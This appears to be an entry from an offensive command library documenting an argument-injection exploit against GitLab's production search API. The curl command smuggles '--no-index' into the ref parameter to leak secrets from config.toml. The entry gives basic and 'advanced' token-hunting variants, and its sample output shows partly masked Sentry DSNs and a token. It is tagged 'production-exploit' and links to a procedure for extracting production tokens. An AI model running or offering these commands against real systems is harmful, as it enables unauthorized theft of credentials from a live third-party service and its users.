---
id: cmd-uuid-3
data: >-
  curl
  'https://gitlab.com/api/v4/projects/2009901/search?scope=blobs&search=a&ref=--no-index'
tags:
  - api-request
  - production-exploit
type: command
output: >-
  JSON response containing escaped strings like 'sentry_dsn =
  'https://927bee37df654608xxxxxxxxxxxxxxxx:0324504ee7844264xxxxxxxxxxxxxxxx@sentry.gitlab.net/16',
  'ruby_sentry_dsn =
  'https://8ff7dd344e1d4976xxxxxxxxxxxxxxxx:bb9d785b3fe7447bxxxxxxxxxxxxxxxx@sentry.gitlab.net/29',
  'token = 'yfZTE0Oxxxxxxx''
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.438Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-search-injection-production

## Command

```bash
curl 'https://gitlab.com/api/v4/projects/2009901/search?scope=blobs&search=a&ref=--no-index'
```

## Description

Performs an unauthenticated request to a production GitLab Search API, injecting --no-index to leak sensitive config from config.toml using a common search pattern 'a'.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `projects/2009901` | Public project ID on gitlab.com | Yes |
| `scope=blobs` | Search scope | Yes |
| `search=a` | Pattern to match config lines | Yes |
| `ref=--no-index` | Injected flag for directory search | Yes |

## Examples

### Basic Usage

```bash
curl 'https://gitlab.com/api/v4/projects/2009901/search?scope=blobs&search=a&ref=--no-index'
```

### Advanced Usage

```bash
curl -s 'https://gitlab.com/api/v4/projects/2009901/search?scope=blobs&search=token&ref=--no-index' | jq '.[].data'
```

## Expected Output

JSON with leaked tokens, e.g., Sentry DSNs and Gitaly tokens from config.toml.

## Related

- [[commands/curl-gitlab-search-injection-local]]
- [[procedures/Extract-Sensitive-Tokens-from-Production]]
